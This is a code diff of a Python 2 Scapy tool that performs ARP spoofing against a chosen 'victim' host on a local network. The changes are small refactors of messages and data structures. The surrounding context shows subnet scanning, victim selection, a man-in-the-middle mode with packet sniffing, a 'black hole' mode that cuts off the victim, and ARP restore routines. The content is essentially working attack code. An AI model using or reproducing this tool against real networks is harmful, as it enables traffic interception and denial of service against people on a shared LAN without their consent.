@@ -74,7 +74,7 @@ def spoof_MITM(gateway_IP, gateway_MAC, victim_IP, victim_MAC):
 
 
 def restore_MITM(gateway_IP, victim_IP, gateway_MAC, victim_MAC):
-    print "[Info.] Start to recover the WLAN."
+    print "[Info.] Start to recover the LAN."
     print "[Info.] Please wait for a while."
     print "[Info.] Sending real ARP replies to gateway..."
     send(ARP(op=2, psrc=victim_IP, pdst=gateway_IP, hwsrc=victim_MAC, hwdst=gateway_MAC), count=8)  # Real ARP reply
@@ -82,7 +82,7 @@ def restore_MITM(gateway_IP, victim_IP, gateway_MAC, victim_MAC):
     print "[Info.] Sending real ARP replies to victim..."
     send(ARP(op=2, psrc=gateway_IP, pdst=victim_IP, hwsrc=gateway_MAC, hwdst=victim_MAC), count=8)  # Real ARP reply
     time.sleep(3)
-    print "[Info.] The WLAN has been recovered."
+    print "[Info.] The LAN has been recovered."
 
 
 def parse_ip_header(packet):
@@ -198,12 +198,12 @@ def spoof_black_hole(gateway_IP, victim_IP, victim_MAC):
 
 def restore_black_hole(gateway_IP, victim_IP, victim_MAC):
     gateway_MAC = get_MAC(gateway_IP)
-    print "[Info.] Start to recover the WLAN."
+    print "[Info.] Start to recover the LAN."
     print "[Info.] Please wait for a while."
     print "[Info.] Sending real ARP replies to victim..."
     send(ARP(op=2, psrc=gateway_IP, pdst=victim_IP, hwsrc=gateway_MAC, hwdst=victim_MAC), count=8)  # Real ARP reply
     time.sleep(3)
-    print "[Info.] The WLAN has been recovered."
+    print "[Info.] The LAN has been recovered."
 
 
 def get_MAC(IP):
@@ -240,19 +240,21 @@ if __name__ == "__main__":
     conf.verb = 1
 
     ans, unans = srp(Ether(dst=broadcast_mac)/ARP(pdst=ip_range), timeout=8, iface=interface_name, inter=0.12)
-    ip_list = []
-    mac_list = []
+    device_list = []
+    #ip_list = []
+    #mac_list = []
     print "\n[Info.] Host list:\n{:^7}|{:^15}|{:^20}".format("No.", "IP", "MAC")
     count = 0
     for snd, rcv in ans:
         count += 1
-        ip_list.append(rcv.sprintf("%ARP.psrc%"))
-        mac_list.append(rcv.sprintf("%Ether.src%"))
-        print "[{:^5}]:{:^15}-{:^20}".format(count, ip_list[(count - 1)], mac_list[(count - 1)])
+        device_list.append({"IP": rcv.sprintf("%ARP.psrc%"), "MAC": rcv.sprintf("%Ether.src%")})
+        #ip_list.append(rcv.sprintf("%ARP.psrc%"))
+        #mac_list.append(rcv.sprintf("%Ether.src%"))
+        print "[{:^5}]:{:^15}-{:^20}".format(count, device_list[(count - 1)]["IP"], device_list[(count - 1)]["MAC"])
 
     stop_time = datetime.now()
     total_time = stop_time - start_time
-    device_count = len(ip_list)
+    device_count = len(device_list)
     print "\n[Info.] Scan completed.\n[Info.] Scan duration: %s sec." % (total_time)
     print "[Info.] Device number in the subnet: %d" % (device_count)
 
@@ -265,14 +267,14 @@ if __name__ == "__main__":
         if victim_info > 0 and victim_info <= device_count:
             break
 
-    print "[Info.] Host: %s is the victim to attack." % ip_list[(victim_info-1)]
+    print "[Info.] Host: %s is the victim to attack." % device_list[(victim_info - 1)]["IP"]
 
     available_attacking_mode = {AttackType.MAN_IN_THE_MIDDLE, AttackType.BLACK_HOLE}
     available_sniffing_mode = {SniffType.ALL_PACKETS, SniffType.VICTIM_PACKETS}
 
     while True:
         print "[Info.] Please select an attacking mode:"
-        print "[1] Man in the middle(MITM)\n[2] Black Hole"
+        print "[%d] Man in the middle(MITM)\n[%d] Black Hole" % (AttackType.MAN_IN_THE_MIDDLE, AttackType.BLACK_HOLE)
         function_choice = int(raw_input("[Info.] Function:\n"))
         if function_choice in available_attacking_mode:
             break
@@ -281,12 +283,14 @@ if __name__ == "__main__":
         if function_choice == AttackType.MAN_IN_THE_MIDDLE:
             target_interface = interface_name
             print "[Info.] target_interface=%s" % target_interface
-            victim_IP = ip_list[(victim_info - 1)]
-            gateway_IP = ip_list[(gateway_info - 1)]
+            victim_IP = device_list[(victim_info - 1)]["IP"]
+            gateway_IP = device_list[(gateway_info - 1)]["IP"]
+            print "[Info.] victim_IP=%s, gateway_IP=%s" % (victim_IP, gateway_IP)
 
             while True:
                 print "[Info.] Please select the sniffing mode you want:"
-                print "[1] All packets in the specific network interface\n[2] Only packets related to the victim"
+                print "[%d] All packets in the specific network interface\n[%d] Only packets related to the victim" \
+                    % (SniffType.ALL_PACKETS, SniffType.VICTIM_PACKETS)
                 sniffing_mode_choice = int(raw_input("[Info.] Sniffing mode:\n"))
                 if sniffing_mode_choice in available_sniffing_mode:
                     break
@@ -295,8 +299,9 @@ if __name__ == "__main__":
         elif function_choice == AttackType.BLACK_HOLE:
             target_interface = interface_name
             print "[Info.] target_interface=%s" % target_interface
-            victim_IP = ip_list[(victim_info - 1)]
-            gateway_IP = ip_list[(gateway_info - 1)]
+            victim_IP = device_list[(victim_info - 1)]["IP"]
+            gateway_IP = device_list[(gateway_info - 1)]["IP"]
+            print "[Info.] victim_IP=%s, gateway_IP=%s" % (victim_IP, gateway_IP)
             black_hole()
             break
         else:
